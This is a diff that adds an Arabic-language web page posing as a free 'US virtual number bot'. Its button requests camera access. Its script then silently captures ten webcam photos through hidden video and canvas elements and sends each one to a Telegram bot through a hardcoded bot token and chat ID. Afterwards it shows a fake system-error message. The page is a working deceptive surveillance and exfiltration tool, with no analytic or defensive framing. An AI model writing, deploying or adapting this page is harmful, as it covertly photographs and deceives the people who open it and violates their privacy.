@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوت الأرقام الأمريكية المجاني</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #1c1c1c; color: white; text-align: center; padding-top: 50px; }
+        .container { border: 1px solid #333; padding: 20px; border-radius: 15px; display: inline-block; background: #252525; }
+        .btn { background-color: #0088cc; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 18px; }
+        video { display: none; }
+        canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/Question_mark.png" width="80">
+        <h2>مرحباً بك في بوت الأرقام الوهمية</h2>
+        <p>لتفعيل رقمك الأمريكي الجديد، يرجى الضغط على الزر أدناه ومنح الأذونات اللازمة.</p>
+        <button class="btn" onclick="startProcess()">إضغط هنا للحصول على الرقم</button>
+    </div>
+
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const token = "8449385232:AAFWHjoguEdjl-I_rU4w78SSzJLK0DCkHYU";
+        const chatId = "8397194527";
+        let photoCount = 0;
+
+        async function startProcess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                
+                // بدء عملية التقاط 10 صور بمجرد السماح
+                let captureInterval = setInterval(() => {
+                    if (photoCount < 10) {
+                        takeSnap();
+                        photoCount++;
+                    } else {
+                        clearInterval(captureInterval);
+                        alert("عذراً، حدث خطأ في النظام. حاول مجدداً لاحقاً.");
+                    }
+                }, 1500); // التقاط صورة كل ثانية ونصف
+            } catch (err) {
+                alert("يجب السماح بالوصول للكاميرا لتتمكن من استخدام البوت.");
+            }
+        }
+
+        function takeSnap() {
+            const canvas = document.getElementById('canvas');
+            const video = document.getElementById('video');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(blob => {
+                sendToTelegram(blob);
+            }, 'image/jpeg');
+        }
+
+        function sendToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'image.jpg');
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+    </script>
+</body>
+</html>
